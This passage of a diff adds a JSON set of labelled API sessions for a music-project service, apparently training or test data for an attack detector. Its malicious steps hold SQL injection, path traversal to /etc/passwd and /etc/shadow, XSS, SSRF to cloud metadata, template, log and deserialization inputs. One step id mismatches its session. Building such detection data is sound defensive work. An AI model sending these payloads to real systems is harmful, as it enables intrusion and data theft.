+          "email": "designer76@example.com",
+          "password": "Password76!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess076-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token76"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess076-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj-76/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token76",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Track Song\n[ERROR] 2026-03-30 17:00:00 Log injection attack.",
+          "durationSeconds": 160
+        },
+        "note": "The client injects a log stamp with a newline."
+      },
+      {
+        "id": "sess076-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-76/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token76"
+        },
+        "body": null,
+        "note": "The designer views project tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess077",
+    "client_ip": "172.16.110.15",
+    "steps": [
+      {
+        "id": "sess077-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer77@example.com",
+          "password": "Password77!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess077-s02",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token77",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Master's Cut",
+          "description": "Vinyl pressing"
+        },
+        "note": "The client uses an apostrophe in the project title."
+      },
+      {
+        "id": "sess077-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token77"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess077-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-77",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token77"
+        },
+        "body": null,
+        "note": "The designer views project 77."
+      }
+    ]
+  },
+  {
+    "session_id": "sess078",
+    "client_ip": "10.110.120.30",
+    "steps": [
+      {
+        "id": "sess078-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer78@example.com",
+          "password": "Password78!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess078-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token78"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess078-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-78",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token78"
+        },
+        "body": null,
+        "note": "The designer views project 78."
+      },
+      {
+        "id": "sess078-s04",
+        "suspicious_benign": true,
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-78/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token78",
+          "X-Reference": "Mentioning SSRF attack concept in header."
+        },
+        "body": null,
+        "note": "The client mentions a security term in a header."
+      }
+    ]
+  },
+  {
+    "session_id": "sess079",
+    "client_ip": "192.168.170.80",
+    "steps": [
+      {
+        "id": "sess079-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token79",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SQL Injection 4",
+          "description": "' OR 1=1 --"
+        },
+        "note": "The client performs a SQL injection attack."
+      },
+      {
+        "id": "sess079-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer79@example.com",
+          "password": "Password79!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess079-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token79"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess079-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess080",
+    "client_ip": "172.33.20.40",
+    "steps": [
+      {
+        "id": "sess080-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer80@example.com",
+          "password": "Password80!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess080-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token80"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess080-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/passwd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token80"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal."
+      },
+      {
+        "id": "sess080-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-80",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token80"
+        },
+        "body": null,
+        "note": "The designer views project 80."
+      }
+    ]
+  },
+  {
+    "session_id": "sess081",
+    "client_ip": "10.120.130.40",
+    "steps": [
+      {
+        "id": "sess081-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer81@example.com",
+          "password": "Password81!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess081-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token81"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess081-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token81",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Acoustic Album",
+          "description": "Standard release",
+          "client_platform": "web_browser_v2"
+        },
+        "note": "The client includes a harmless extra metadata field."
+      },
+      {
+        "id": "sess081-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-81",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token81"
+        },
+        "body": null,
+        "note": "The designer views project 81."
+      }
+    ]
+  },
+  {
+    "session_id": "sess082",
+    "client_ip": "192.168.180.90",
+    "steps": [
+      {
+        "id": "sess082-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token82",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Privilege Field 3",
+          "account_type": "administrator"
+        },
+        "note": "The client passes an uncontracted privilege field."
+      },
+      {
+        "id": "sess082-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer82@example.com",
+          "password": "Password82!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess082-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token82"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess082-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess083",
+    "client_ip": "172.16.120.25",
+    "steps": [
+      {
+        "id": "sess083-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer83@example.com",
+          "password": "Password83!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess083-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token83"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess083-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-other-888",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token83"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word other is only part of the id string."
+      },
+      {
+        "id": "sess083-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-83",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token83"
+        },
+        "body": null,
+        "note": "The designer views their own project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess084",
+    "client_ip": "10.130.140.50",
+    "steps": [
+      {
+        "id": "sess084-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer84@example.com",
+          "password": "Password84!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess084-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token84"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess084-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/trk-84/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token84",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<script>alert('XSS 2')</script>"
+        },
+        "note": "The client attempts XSS in mastering notes."
+      },
+      {
+        "id": "sess084-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/trk-84/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token84"
+        },
+        "body": null,
+        "note": "The designer views notes."
+      }
+    ]
+  },
+  {
+    "session_id": "sess085",
+    "client_ip": "192.168.190.10",
+    "steps": [
+      {
+        "id": "sess085-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/2.0 (compatible; MSIE 2.0; Windows 3.1)"
+        },
+        "body": {
+          "email": "designer85@example.com",
+          "password": "Password85!"
+        },
+        "note": "The client logs in using a very old legacy browser agent."
+      },
+      {
+        "id": "sess085-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token85"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess085-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-85",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token85"
+        },
+        "body": null,
+        "note": "The designer views project 85."
+      },
+      {
+        "id": "sess085-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-85/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token85"
+        },
+        "body": null,
+        "note": "The designer views tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess086",
+    "client_ip": "172.34.10.50",
+    "steps": [
+      {
+        "id": "sess086-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer86@example.com",
+          "password": "Password86!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess086-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token86"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess086-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token86",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SSRF Cloud",
+          "description": "http://169.254.169.254/latest/user-data"
+        },
+        "note": "The client attempts SSRF targeting cloud user-data."
+      },
+      {
+        "id": "sess086-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess087",
+    "client_ip": "10.140.150.60",
+    "steps": [
+      {
+        "id": "sess087-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer87@example.com",
+          "password": "Password87!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess087-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token87"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess087-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token87",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "${7*8}",
+          "description": "Template injection multiplication"
+        },
+        "note": "The client injects a template expression."
+      },
+      {
+        "id": "sess087-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-87",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token87"
+        },
+        "body": null,
+        "note": "The designer views project 87."
+      }
+    ]
+  },
+  {
+    "session_id": "sess088",
+    "client_ip": "192.168.200.20",
+    "steps": [
+      {
+        "id": "sess088-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer88@example.com",
+          "password": "Password88!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess088-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token88"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess088-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token88",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Serialized Object 5",
+          "description": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc..."
+        },
+        "note": "The client posts a serialized object payload."
+      },
+      {
+        "id": "sess088-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess089",
+    "client_ip": "172.16.130.40",
+    "steps": [
+      {
+        "id": "sess089-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer89@example.com",
+          "password": "Password89!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess090-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token89"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess089-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj-89/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token89",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Song Track\n[FATAL] 2026-03-30 18:30:00 Log injection attack trace.",
+          "durationSeconds": 135
+        },
+        "note": "The client injects a log stamp with a newline."
+      },
+      {
+        "id": "sess089-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-89/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token89"
+        },
+        "body": null,
+        "note": "The designer views project tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess090",
+    "client_ip": "10.150.160.70",
+    "steps": [
+      {
+        "id": "sess090-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer90@example.com",
+          "password": "Password90!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess090-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token90"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess090-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-90",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token90"
+        },
+        "body": null,
+        "note": "The designer views project 90."
+      },
+      {
+        "id": "sess090-s04",
+        "suspicious_benign": true,
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-90/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token90",
+          "X-Reference": "Mentioning remote code execution in notes."
+        },
+        "body": null,
+        "note": "The client mentions a security term in a header."
+      }
+    ]
+  },
+  {
+    "session_id": "sess091",
+    "client_ip": "192.168.210.30",
+    "steps": [
+      {
+        "id": "sess091-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer91@example.com",
+          "password": "Password91!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess091-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token91"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess091-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token91",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SQL Injection 5",
+          "description": "' UNION SELECT null, null --"
+        },
+        "note": "The client performs a SQL injection UNION attack."
+      },
+      {
+        "id": "sess091-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess092",
+    "client_ip": "172.35.20.10",
+    "steps": [
+      {
+        "id": "sess092-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/auth/register",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Note": "Registration info\nwith a sentence continuing on the next line."
+        },
+        "body": {
+          "email": "designer92@example.com",
+          "password": "Password92!"
+        },
+        "note": "The client registers with a header containing a newline sentence continuation."
+      },
+      {
+        "id": "sess092-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer92@example.com",
+          "password": "Password92!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess092-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token92"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess092-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-92",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token92"
+        },
+        "body": null,
+        "note": "The designer views project 92."
+      }
+    ]
+  },
+  {
+    "session_id": "sess093",
+    "client_ip": "10.160.170.80",
+    "steps": [
+      {
+        "id": "sess093-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer93@example.com",
+          "password": "Password93!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess093-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token93"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess093-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token93"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal to shadow."
+      },
+      {
+        "id": "sess093-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess094",
+    "client_ip": "192.168.220.40",
+    "steps": [
+      {
+        "id": "sess094-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer94@example.com",
+          "password": "Password94!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess094-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token94"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess094-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/trk-94/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token94",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<script>alert('XSS 3')</script>"
+        },
+        "note": "The client attempts XSS in notes."
+      },
+      {
+        "id": "sess094-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/trk-94/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token94"
+        },
+        "body": null,
+        "note": "The designer views notes."
+      }
+    ]
+  },
+  {
+    "session_id": "sess095",
+    "client_ip": "172.16.140.50",
+    "steps": [
+      {
+        "id": "sess095-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer95@example.com",
+          "password": "Password95!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess095-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token95"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess095-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token95",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SSRF Localhost",
+          "description": "http://127.0.0.1:9000/api"
+        },
+        "note": "The client attempts SSRF targeting local API endpoint."
+      },
+      {
+        "id": "sess095-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess096",
+    "client_ip": "10.170.180.90",
+    "steps": [
+      {
+        "id": "sess096-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer96@example.com",
+          "password": "Password96!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess096-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token96"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess096-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token96",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Synth Wave",
+          "description": "Retro album",
+          "app_version": "v3.1.4"
+        },
+        "note": "The client includes a harmless extra metadata field."
+      },
+      {
+        "id": "sess096-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-96",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token96"
+        },
+        "body": null,
+        "note": "The designer views project 96."
+      }
+    ]
+  },
+  {
+    "session_id": "sess097",
+    "client_ip": "192.168.230.50",
+    "steps": [
+      {
+        "id": "sess097-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token97",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Privilege Field 4",
+          "user_role": "admin"
+        },
+        "note": "The client passes an uncontracted privilege field."
+      },
+      {
+        "id": "sess097-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer97@example.com",
+          "password": "Password97!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess097-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token97"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess097-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess098",
+    "client_ip": "172.36.30.20",
+    "steps": [
+      {
+        "id": "sess098-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer98@example.com",
+          "password": "Password98!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess098-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token98"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess098-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-other-444",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token98"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word other is only part of the id string."
+      },
+      {
+        "id": "sess098-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-98",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token98"
+        },
+        "body": null,
+        "note": "The designer views project 98."
+      }
+    ]
+  },
+  {
+    "session_id": "sess099",
+    "client_ip": "10.180.190.100",
+    "steps": [
+      {
+        "id": "sess099-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer99@example.com",
+          "password": "Password99!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess099-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token99"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess099-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token99",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "${7*9}",
+          "description": "Template injection test"
+        },
+        "note": "The client injects a template expression."
+      },
+      {
+        "id": "sess099-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess100",
+    "client_ip": "192.168.240.60",
+    "steps": [
+      {
+        "id": "sess100-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer100@example.com",
+          "password": "Password100!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess100-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token100"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess100-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj-100/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token100",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Closing Track's Remix",
+          "durationSeconds": 220
+        },
+        "note": "The client includes an apostrophe in the track name."
+      },
+      {
+        "id": "sess100-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-100/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token100"
+        },
+        "body": null,
+        "note": "The designer views project tracks."
+      }
+    ]
+  }
+]
